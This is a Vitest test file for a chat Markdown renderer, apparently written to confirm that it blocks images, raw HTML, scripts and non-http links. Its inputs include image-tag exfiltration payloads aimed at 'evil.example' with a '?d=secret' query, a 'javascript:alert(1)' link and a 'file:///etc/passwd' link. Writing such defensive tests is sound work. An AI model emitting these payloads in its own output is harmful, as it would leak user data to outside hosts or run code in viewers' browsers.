import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, expect, test } from "vitest";
import { ChatMarkdown, chatUrl } from "./ChatMarkdown";

afterEach(cleanup);

function draw(text: string): HTMLElement {
	return render(<ChatMarkdown text={text} />).container;
}

test("no form of image is ever drawn, so nothing loads from another host", () => {
	const view = draw(
		[
			"![leak](https://evil.example/x.png?d=secret)",
			"![ref][r]",
			"[r]: https://evil.example/r.png",
			'<img src="https://evil.example/tag.png">',
			"[![nested](https://evil.example/n.png)](https://example.com)",
		].join("\n\n"),
	);
	expect(view.querySelector("img")).toBeNull();
	expect(view.textContent).toContain("leak");
});

test("raw HTML is never turned into elements", () => {
	const view = draw(
		'Hello <b>bold</b> <script>alert(1)</script><iframe src="https://x"></iframe>',
	);
	expect(view.querySelector("b, script, iframe")).toBeNull();
});

test("links open in a new tab, without the opener or a referrer", () => {
	draw("See [the docs](https://example.com/docs).");
	const link = screen.getByRole("link", { name: "the docs" });
	expect(link.getAttribute("href")).toBe("https://example.com/docs");
	expect(link.getAttribute("target")).toBe("_blank");
	expect(link.getAttribute("rel")).toBe("noopener noreferrer");
});

test("a link that is not http or https is only text", () => {
	const view = draw(
		"[run](javascript:alert(1)) [file](file:///etc/passwd) <command:workbench> [rel](./a.md)",
	);
	expect(view.querySelector("a")).toBeNull();
	expect(view.textContent).toContain("run");
	expect(chatUrl("mailto:a@b")).toBe("");
	expect(chatUrl("HTTPS://example.com")).toBe("HTTPS://example.com");
});

test("Markdown renders: lists, code and tables", () => {
	const view = draw(
		"- one\n- two\n\n```ts\nconst x = 1;\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |",
	);
	expect(view.querySelectorAll("li")).toHaveLength(2);
	expect(view.querySelector("pre")?.getAttribute("tabindex")).toBe("0");
	expect(view.querySelector("table")).not.toBeNull();
});
